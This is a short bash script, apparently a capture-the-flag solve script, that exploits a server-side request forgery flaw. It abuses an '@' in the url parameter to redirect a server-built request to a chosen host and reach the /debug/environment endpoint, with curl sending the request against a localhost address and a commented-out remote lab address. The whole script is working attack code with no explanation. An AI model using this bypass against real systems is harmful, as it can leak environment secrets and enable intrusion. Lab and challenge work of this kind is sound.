#!/bin/bash

# bypass this = f'http://{SITE_NAME}{url}' 
url="http://127.0.0.1:1337/?url=@$1:1337/debug/environment"
# url="http://94.237.54.42:47180/?url=@$1:1337/debug/environment"

curl -s $url
